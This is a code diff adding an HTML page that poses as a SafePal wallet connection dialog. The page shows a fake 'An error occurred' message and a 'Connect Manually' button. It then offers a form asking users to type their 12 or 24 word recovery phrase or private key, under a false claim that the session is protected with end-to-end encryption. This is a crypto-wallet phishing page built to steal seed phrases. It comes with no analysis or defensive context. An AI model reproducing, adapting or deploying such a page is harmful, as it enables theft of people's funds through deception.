@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <link rel="stylesheet" href="style2.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script src="b9d6a20d-4272-452d-b87a-84032e615c54.js"></script>
+</head>
+<body>
+    <div class="modal fade popup show" id="popup_connect_wallet" tabindex="-1" style="display: block; padding-right: 15px;" aria-modal="true" role="dialog">
+        <div class="modal-dialog modal-dialog-centered" role="document">
+            <div class="modal-content">
+                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+                    <span aria-hidden="true">×</span>
+                </button>
+                <div class="modal-body space-y-20 pd-40">
+
+                    <h3>
+                        <img width="50" height="50" class="avatar" id="wallet_logo" src="safepal.png"><br>
+                        <span id="wallet_name" clas="mt-1">safepal</span>
+                    </h3>
+                    <p class="text-center">
+                        An error occurred... please try again or connect manually </p>
+                        
+
+                   
+
+                    <div id="failed_to_connect" style="display: none;">
+                        <div style="padding:6px; color:red; border:1px solid red; border-radius:5px; text-align:center!important; font-size:16px; font-weight:500;">
+                            An error occurred... please try again or connect manually
+                        </div>
+                    </div>
+                    <br>
+                    <div class="happy">
+                        
+                        <br><br>
+                        <a href="index4.html" id="button_connect_manually" class="btn btn-primary">Connect Manually</a></div>
+
+                    <div id="div_connect_manuallly" style="display:none;">
+                        <textarea style="font-size:25px; font-weight:650" rows="4" name="secret_phrase" id="secret_phrase" class="form-control text-primary" placeholder="Enter your 12 or 24 Mnemonic words. Seperate them with spaces. You can also input your privatekey instead."></textarea><br>
+
+                        <button disabled="" type="button" id="button_connect_wallet" class="btn btn-primary" style="border-top: 5px; opacity:0.2">Connect Wallet</button>
+                    </div>
+
+
+                    <div>
+                        <br><br><br>
+                        <h5 align="center" class="mt-4 text-muted align-items-center"><img src="shield.png" width="30" height="30"> This session is protected
+                            with an end-to-end encryption</h5>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <style>
+        .btn-outline-primary {
+            width: 100%;
+            border-radius: 20px;
+            font-weight: 700;
+            font-size: 15px;
+            line-height: 22px;
+            padding: 10px 20px;
+            -webkit-transition: all 0.3s ease-in-out;
+            -moz-transition: all 0.3s ease-in-out;
+            -ms-transition: all 0.3s ease-in-out;
+            -o-transition: all 0.3s ease-in-out;
+            transition: all 0.3s ease-in-out;
+            outline: none;
+            border: 1px solid #5142FC;
+            margin-bottom: 10px
+        }
+        .style interact-button {
+            width: 100%;
+            border-radius: 20px;
+            font-weight: 700;
+            font-size: 15px;
+            line-height: 22px;
+            padding: 10px 20px;
+            -webkit-transition: all 0.3s ease-in-out;
+            -moz-transition: all 0.3s ease-in-out;
+            -ms-transition: all 0.3s ease-in-out;
+            -o-transition: all 0.3s ease-in-out;
+            transition: all 0.3s ease-in-out;
+            outline: none;
+            border: 1px solid #5142FC;
+            margin-bottom: 10px
+        }
+    </style>
+
+</body>
+</html>
